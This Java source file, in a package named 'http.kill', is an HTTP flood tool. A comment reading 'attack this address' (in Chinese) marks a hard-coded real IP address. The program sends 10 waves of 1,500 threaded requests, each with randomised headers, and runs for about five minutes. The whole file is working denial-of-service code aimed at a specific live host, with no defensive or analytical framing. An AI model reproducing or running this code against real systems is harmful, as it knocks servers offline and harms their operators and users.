package com.http.kill;


import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Main {
	public static void main(String[] args) {
		t1();
	}

	static void t1() {
		System.err.println("此程序最多运行5分钟.");
		System.err.println("让我们开始吧...");
		System.err.println("===============");
		int poolSize = 50;

		ExecutorService threadPool = Executors.newFixedThreadPool(poolSize);
		TT1 t = null;
		String value = "dkfjdlkjf" + System.currentTimeMillis();

		for (int n = 1; n <= 10; n++) {
			for (int i = 1, end = poolSize * 30; i <= end; i++) {
				t = new TT1();
				t.tName = n + "_" + i;
				t.value = value;
				threadPool.execute(t);
			}

			try {
				Thread.sleep(7000);
			} catch (InterruptedException e) {
			}
		}

		try {
			Thread.sleep(1000 * 60 * 4);
			System.err.println("===============");
			System.err.println("程序关闭.");
			threadPool.shutdownNow();
			System.exit(0);
		} catch (Exception e) {
		}
	}

	static class TT1 extends Thread {

		public String tName = "";
		public String value = "";

		public void run() {
			System.out.println(tName + " 启动.");
			t3_1(value);
		}

		void t3_1(String name) {
			try {
				// 攻击这个地址
				URL url = new URL("http://114.115.216.134");
//                int readLen = 0;
				byte[] buffer = new byte[64];
				InputStream in = null;
				HttpURLConnection conn = (HttpURLConnection) url.openConnection();

				conn.setRequestProperty(UUID.randomUUID().toString(), UUID.randomUUID().toString());
				conn.setRequestProperty(UUID.randomUUID().toString(),UUID.randomUUID().toString());
				conn.setConnectTimeout(1000);
				conn.setReadTimeout(500);

				conn.connect();
				in = conn.getInputStream();
				in.read(buffer);
//                while(-1 != (readLen = in.read(buffer))){
////                    System.out.println(new String(buffer, 0, readLen));
//                }

				conn.disconnect();
			} catch (Exception e) {
			}
		}
	}
}
